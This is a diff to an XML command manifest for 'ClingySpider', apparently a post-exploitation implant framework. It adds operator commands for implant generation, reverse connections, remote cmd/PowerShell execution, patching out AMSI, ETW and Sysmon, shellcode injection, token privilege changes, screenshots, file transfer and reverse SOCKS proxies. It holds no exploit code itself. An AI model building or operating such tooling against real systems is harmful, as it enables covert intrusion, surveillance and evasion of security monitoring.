@@ -1,33 +1,414 @@
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 
 <Module name='ClSp'>
-	<Command name='clsp_connect' provider='ClSp_connect.py' type='script'>
+	<Command name='cs_connect' provider='cs_connect.py' type='script'>
 		<Description>Opens and exports a direct connection to ClingySpider Implant</Description>
-		<Argument name='host' type='string'>
+		<Argument name='host' type='string' >
 			<Description>Implant listening host</Description>
 		</Argument>
-		<Argument name='port' type='string'>
+		<Argument name='port' type='int'>
 			<Description>Implant listening port</Description>
 		</Argument>
-		<Argument name='key_path' type='string'>
-			<Description>Private key file</Description>
+		<Argument name='key' type='string'>
+			<Description>Private key name</Description>
+		</Argument>
+		<Argument name='nosurvey' type='flag' optional='true'>
+			<Description>Dont run survey script and analysis. Target won't be saved in databse.</Description>
+		</Argument>
+		<Argument name='survey_rescan' type='string' optional='true'>
+			<Description>Run survey script if target already on databse. (yes,no)</Description>
+		</Argument>
+		<Argument name='relock' type='flag' optional='true'>
+			<Description>Force re-lock current session module (ex. after restart)</Description>
 		</Argument>
 	</Command>	
-	<Command name='clsp_prepare' provider='ClSp_prepare.py' type='script'>
+	<Command name='cs_prep' provider='cs_prep.py' type='script'>
 		<Description>Generates a ready-to-use ClingySpider implant</Description>
+		<Argument name='type' type='int' optional='true'>
+			<Description>Implant type</Description>
+		</Argument>
+		<Argument name='port' type='int' optional='true'>
+			<Description>Implant listening port</Description>
+		</Argument>
+		<Argument name='host' type='string' optional='true'>
+			<Description>Implant host</Description>
+		</Argument>
+		<Argument name='id' type='int' optional='true'>
+			<Description>Implant id</Description>
+		</Argument>
+		<Argument name='pubkey' type='string' optional='true'>
+			<Description>Name of public key in keystorage</Description>
+		</Argument>
+		<Argument name='timeout' type='int' optional='true'>
+			<Description>Implant reverse connection timeout</Description>
+		</Argument>
+		<Argument name='random_useragent' type='flag' optional='true'>
+			<Description>Use random useragent</Description>
+		</Argument>
+		<Argument name='useragent' type='string' optional='true'>
+			<Description>Specify useragent string. Ignored if 'random_useragent' specified</Description>
+		</Argument>
+		<Argument name='use_ssl' type='string' optional='true'>
+			<Description>Do you want to use SSL TLS in http connection (yes,no)</Description>
+		</Argument>
+	</Command>
+	<Command name='cmd_shell' provider='cmd_shell.py' dependency='clsp' type='script'>
+		<Description>Spawn cmd.exe session</Description>
+		<Argument name='delay' type='int' optional='true'>
+			<Description>Use a delay in milliseconds before retrieving shell command output (DEFAULT is 500 ms)</Description>
+		</Argument>
+	</Command>
+	<Command name='dllblock' provider='dll_block.py' dependency='clsp' type='script'>
+		<Description>Enables/disables loading of foreign dlls</Description>
+		<Argument name='state' type='int'>
+			<Description>Value [0/1]</Description>
+		</Argument>
 	</Command>
 	<Command name='keygen' provider='keygen.py' type='script'>
-		<Description>Generates and saves rsa keypair</Description>
-		<Argument name='key_path' type='string'>
-			<Description>Keypair output directory</Description>
+		<Description>Generates and saves keypair</Description>
+		<Argument name='name' type='string'>
+			<Description>Key name</Description>
+		</Argument>
+		<Argument name='algorithm' type='string'>
+			<Description>Key algorithm (rsa2048)</Description>
+		</Argument>
+	</Command>	
+	<Command name='proclist' provider='proclist.py' type='script' dependency='clsp'>
+		<Description>List running processes</Description>
+		<Argument name='minimal' type='flag' optional='true'>
+			<Description>Do not perform additional process information queries</Description>
 		</Argument>
 	</Command>		
 	<Command name='whoami' provider='whoami.py' dependency='clsp' type='script'></Command>	
-	<Command name='pwd' provider='pwd.py' dependency='clsp' type='script'></Command>	
+	<Command name='_pwd' provider='_pwd.py' dependency='clsp' type='script'></Command>	
 	<Command name='exec' provider='exec.py' dependency='clsp' type='script'>
-		<Description>Executes the specified command and returns the output</Description>
+		<Description>Executes the specified command via Cmd.exe /c and returns the output</Description>
 		<Argument name='cmd' type='string'>
 			<Description>Command to execute</Description>
 		</Argument>
+		<Argument name='timeout' type='int' optional='true'>
+			<Description>Time to wait for output</Description>
+		</Argument>
 	</Command>	
+	<Command name='powershell' provider='powershell.py' dependency='clsp' type='script'>
+		<Description>Executes the specified command via Powershell and returns the output</Description>
+		<Argument name='cmd' type='string'>
+			<Description>Command to execute</Description>
+		</Argument>
+		<Argument name='timeout' type='int' optional='true'>
+			<Description>Time to wait for output</Description>
+		</Argument>
+		<Argument name='noamsi' type='flag' optional='true'>
+			<Description>Patch amsi</Description>
+		</Argument>
+		<Argument name='noetw' type='flag' optional='true'>
+			<Description>Patch etw</Description>
+		</Argument>
+	</Command>		
+	<Command name='put' provider='put.py' dependency='clsp' type='script'>
+		<Argument name='src' type='string'>
+			<Description>Path to source file</Description>
+		</Argument>		
+		<Argument name='out' type='string'>
+			<Description>Path to output file</Description>
+		</Argument>
+	</Command>
+	<Command name='get' provider='get.py' dependency='clsp' type='script'>
+		<Argument name='src' type='string'>
+			<Description>Path to source file</Description>
+		</Argument>		
+		<Argument name='out' type='string'>
+			<Description>Path to output file</Description>
+		</Argument>
+	</Command>	
+	<Command name='cs_listen' provider='cs_listen.py' type='script'>
+		<Description>Starts listener to ClingySpider Implant</Description>
+		<Argument name='port' type='int'>
+			<Description>Port to listen</Description>
+		</Argument>		
+		<Argument name='key' type='string'>
+			<Description>Private key name</Description>
+		</Argument>
+		<Argument name='nosurvey' type='flag' optional='true'>
+			<Description>Dont run survey script and analysis. Target won't be saved in databse.</Description>
+		</Argument>
+		<Argument name='survey_rescan' type='string' optional='true'>
+			<Description>Run survey script if target already on databse. (yes,no)</Description>
+		</Argument>
+		<Argument name='protocol' type='string'>
+			<Description>Connection protocol (http,https)</Description>
+		</Argument>
+		<Argument name='ssl_key' type='string' optional='true'>
+			<Description>SSL private key (used with 'https' protocol)</Description>
+		</Argument>
+		<Argument name='ssl_cert' type='string' optional='true'>
+			<Description>SSL certificate (used with 'https' protocol)</Description>
+		</Argument>
+	</Command>
+	<Command name='cs_response_timeout' provider='.set MIBA_TASK_RESULT_TIMEOUT %%' dependency='clsp' type='alias'></Command>
+	<Command name='cs_task_timeout' provider='.set MIBA_GET_TASK_TIMEOUT %%' dependency='clsp' type='alias'></Command>
+	<Command name='dir' provider='dir.py' dependency='clsp' type='script'>
+		<Description>Lists files and dirs</Description>
+		<Argument name='path' type='string' optional='true'>
+			<Description>Path to target directory</Description>
+		</Argument>	
+		<Argument name='xmlout' type='string' optional='true'>
+			<Description>Save information to xml file</Description>
+		</Argument>	
+	</Command>
+	<Command name='route' provider='route.py' dependency='clsp' type='script'>
+		<Description>Displays or modifies the route table</Description>
+		<Argument name='query' type='flag' optional='true'>
+			<Description>Displays the route table. (no args required)</Description>
+		</Argument>		
+		<Argument name='add' type='flag' optional='true'>
+			<Description>Adds a given route</Description>
+		</Argument>	
+		<Argument name='delete' type='flag' optional='true'>
+			<Description>Deletes a given route</Description>
+		</Argument>	
+		<Argument name='dest' type='string' optional='true'>
+			<Description>Destination address</Description>
+		</Argument>	
+		<Argument name='mask' type='string' optional='true'>
+			<Description>Network mask</Description>
+		</Argument>	
+		<Argument name='gw' type='string' optional='true'>
+			<Description>Gateway address</Description>
+		</Argument>
+		<Argument name='iface' type='int' optional='true'>
+			<Description>Interface id</Description>
+		</Argument>	
+		<Argument name='metric' type='int' optional='true'>
+			<Description>Route metric</Description>
+		</Argument>	
+		<Argument name='xmlout' optional='true' type='string'>
+			<Description>Save information to xml file (used with '-query' option)</Description>
+		</Argument>
+	</Command>
+	<Command name='cd' provider='vcd.py' dependency='clsp' type='script'>
+		<Description>Changes virtual workdir</Description>
+		<Argument name='path' type='string'>
+			<Description>Path to target directory</Description>
+		</Argument>		
+	</Command>
+	<Command name='pwd' provider='vpwd.py' dependency='clsp' type='script'>
+		<Description>Print current virtual workdir</Description>
+	</Command>
+	<Command name='dllload' provider='dllload.py' dependency='clsp' type='script'>
+		<Description>Load dll in current process</Description>
+		<Argument name='dll' type='string'>
+			<Description>The library to send and load</Description>
+		</Argument>
+		<Argument name='export' type='string' optional='true'>
+			<Description>Export name</Description>
+		</Argument>
+		<Argument name='ordinal' type='int' optional='true'>
+			<Description>Export ordinal</Description>
+		</Argument>
+		<Argument name='nowait' type='flag' optional='true'>
+			<Description>Dont wait for the exported function to complete</Description>
+		</Argument>
+		<Argument name='noexport' type='flag' optional='true'>
+			<Description>Dont call an export function</Description>
+		</Argument>
+	</Command>
+	<Command name='scinject' provider='scinject.py' dependency='clsp' type='script'>
+		<Description>Inject dll in specified process</Description>
+		<Argument name='bin' type='string'>
+			<Description>The shellcode to send and inject</Description>
+		</Argument>
+		<Argument name='pid' type='int'>
+			<Description>The process ID into which to inject</Description>
+		</Argument>
+	</Command>
+	<Command name='ipconfig' provider='ipconfig.py' dependency='clsp' type='script'>
+		<Description>Outputs interface configuration information</Description>
+		<Argument name='xmlout' optional='true' type='string'>
+			<Description>Save information to xml file</Description>
+		</Argument>
+	</Command>
+	<Command name='socksdll' provider='deploy_socks.py' dependency='clsp' type='script'>
+		<Description>Prepare socks proxy server library</Description>
+		<Argument name='arch' type='string'>
+			<Description>Target architecture (WIN64,WIN32)</Description>
+		</Argument>
+		<Argument name='port' type='int'>
+			<Description>Port to listen/reverse connect</Description>
+		</Argument>
+		<Argument name='local_port' type='int' optional='true'>
+			<Description>Port to listen for incoming connection from socks clients (only with -reverse option)</Description>
+		</Argument>
+		<Argument name='host' type='string' optional='true'>
+			<Description>Reverse host</Description>
+		</Argument>
+		<Argument name='reverse' type='flag' optional='true'>
+			<Description>Specifies if proxy server is reverse</Description>
+		</Argument>
+		<Argument name='user' type='string' optional='true'>
+			<Description>Specifies username to proxy server</Description>
+		</Argument>
+		<Argument name='password' type='string' optional='true'>
+			<Description>Specifies password to proxy server</Description>
+		</Argument>
+		<Argument name='shellcode' type='flag' optional='true'>
+			<Description>Generate shellcode from configured dlls</Description>
+		</Argument>
+		<Argument name='autodeploy' type='flag' optional='true'>
+			<Description>Automatically deploy proxy payload</Description>
+		</Argument>
+	</Command>
+	<Command name='pebtool' provider='pebtool.py' dependency='clsp' type='script'>
+		<Description>Get/modify process PEB information</Description>
+		<Argument name='action' type='string'>
+			<Description>Specifies action type (get,set)</Description>
+		</Argument>
+		<Argument name='name' type='string'>
+			<Description>Specifies what to interact with (all_info, process_base, heap_base, subsystem, kct, current_dir, cmd_line, path, global_flag, window_title, module_list)</Description>
+		</Argument>
+		<Argument name='value' type='string' optional='true'>
+			<Description>New value of PEB entry (only with 'set' option)</Description>
+		</Argument>
+	</Command>
+	<Command name='screenshot' provider='screenshot.py' dependency='clsp' type='script'>
+		<Description>Take screenshot of window/desktop</Description>
+		<Argument name='pid' type='int' optional='true'>
+			<Description>Process id we are taking a screenshot of</Description>
+		</Argument>
+		<Argument name='quality' type='int' optional='true'>
+			<Description>Quality of image (default 90)</Description>
+		</Argument>
+	</Command>
+	<Command name='cs_kill' provider='cs_kill.py' dependency='clsp' type='script'>
+		<Description>Kill implant process</Description>
+	</Command>
+	<Command name='sysinfo' provider='sysinfo.py' dependency='clsp' type='script'>
+		<Description>Print basic system information</Description>
+		<Argument name='xmlout' optional='true' type='string'>
+			<Description>Save information to xml file</Description>
+		</Argument>
+	</Command>
+	<Command name='pkill' provider='pkill.py' dependency='clsp' type='script'>
+		<Description>Kill specified process</Description>
+		<Argument name='pid' type='int'>
+			<Description>Target process id</Description>
+		</Argument>
+		<Argument name='code' type='int' optional='true'>
+			<Description>Process exit code (default 0)</Description>
+		</Argument>
+	</Command>
+	<Command name='tokentool' provider='tokentool.py' dependency='clsp' type='script'>
+		<Description>Get/modify target process token information</Description>
+		<Argument name='pid' type='int' optional='true'>
+			<Description>Target process id</Description>
+		</Argument>
+		<Argument name='enable_priv' type='string' optional='true'>
+			<Description>Privilege to enable (* for all)</Description>
+		</Argument>
+		<Argument name='disable_priv' type='string' optional='true'>
+			<Description>Privilege to disable (* for all)</Description>
+		</Argument>
+		<Argument name='query_priv' type='string' optional='true'>
+			<Description>Privilege to query (* for all)</Description>
+		</Argument>
+		<Argument name='use_handle' type='int' optional='true'>
+			<Description>Use opened handle instead of pid (ignores pid)</Description>
+		</Argument>
+	</Command>
+	<Command name='patchtool' provider='patchtool.py' dependency='clsp' type='script'>
+		<Description>Patch AMSI/ETW/SYSMON</Description>
+		<Argument name='pid' type='int' optional='true'>
+			<Description>Target process id</Description>
+		</Argument>
+		<Argument name='use_handle' type='int' optional='true'>
+			<Description>Use opened handle instead of pid (ignores pid)</Description>
+		</Argument>
+		<Argument name='protection' type='string'>
+			<Description>Protection to patch (AMSI/ETW/SYSMON, * for all)</Description>
+		</Argument>
+		<Argument name='action' type='string'>
+			<Description>Action (patch/restore)</Description>
+		</Argument>
+	</Command>
+	<Command name='users' provider='users.py' dependency='clsp' type='script'>
+		<Description>List target machine users</Description>
+		<Argument name='xmlout' optional='true' type='string'>
+			<Description>Save information to xml file</Description>
+		</Argument>
+	</Command>
+	<Command name='groups' provider='groups.py' dependency='clsp' type='script'>
+		<Description>List target machine groups</Description>
+		<Argument name='xmlout' optional='true' type='string'>
+			<Description>Save information to xml file</Description>
+		</Argument>
+	</Command>
+	<Command name='mkdir' provider='mkdir.py' dependency='clsp' type='script'>
+		<Description>Create directory</Description>
+		<Argument name='path' type='string'>
+			<Description>Path to new directory</Description>
+		</Argument>
+		<Argument name='hidden' optional='true' type='flag'>
+			<Description>Create hidden directory</Description>
+		</Argument>
+	</Command>
+	<Command name='rmdir' provider='rmdir.py' dependency='clsp' type='script'>
+		<Description>Remove directory</Description>
+		<Argument name='path' type='string'>
+			<Description>Path to target directory</Description>
+		</Argument>
+	</Command>
+	<Command name='delete' provider='rmdir.py' dependency='clsp' type='script'>
+		<Description>Remove file</Description>
+		<Argument name='path' type='string'>
+			<Description>Path to target file</Description>
+		</Argument>		
+	</Command>
+	<Command name='systemtime' provider='systemtime.py' dependency='clsp' type='script'>
+		<Description>Query system time</Description>
+		<Argument name='xmlout' optional='true' type='string'>
+			<Description>Save information to xml file</Description>
+		</Argument>
+	</Command>
+	<Command name='drives' provider='drives.py' dependency='clsp' type='script'>
+		<Description>Query connected drives info</Description>
+		<Argument name='xmlout' optional='true' type='string'>
+			<Description>Save information to xml file</Description>
+		</Argument>
+	</Command>
+	<Command name='volumes' provider='volumes.py' dependency='clsp' type='script'>
+		<Description>Query drive volumes info</Description>
+		<Argument name='xmlout' optional='true' type='string'>
+			<Description>Save information to xml file</Description>
+		</Argument>
+	</Command>
+	<Command name='services' provider='services.py' dependency='clsp' type='script'>
+		<Description>Query drive volumes info</Description>
+		<Argument name='xmlout' optional='true' type='string'>
+			<Description>Save information to xml file</Description>
+		</Argument>
+	</Command>
+	<Command name='drivers' provider='drivers.py' dependency='clsp' type='script'>
+		<Description>Query system driver list</Description>
+		<Argument name='xmlout' optional='true' type='string'>
+			<Description>Save information to xml file</Description>
+		</Argument>
+	</Command>
+	<Command name='hwinfo' provider='hwinfo.py' dependency='clsp' type='script'>
+		<Description>Query hardware info</Description>
+		<Argument name='xmlout' optional='true' type='string'>
+			<Description>Save information to xml file</Description>
+		</Argument>
+	</Command>
+	<Command name='survey' provider='survey.py' dependency='clsp' type='script'>
+		<Description>Run a system survery</Description>
+		<Argument name='profile' type='string'>
+			<Description>Survery profile (informational)</Description>
+		</Argument>
+	</Command>
+	<Command name='apps' provider='apps.py' dependency='clsp' type='script'>
+		<Description>Query installed software list</Description>
+		<Argument name='xmlout' type='string' optional='true'>
+			<Description>Save information to xml file</Description>
+		</Argument>
+	</Command>
 </Module>
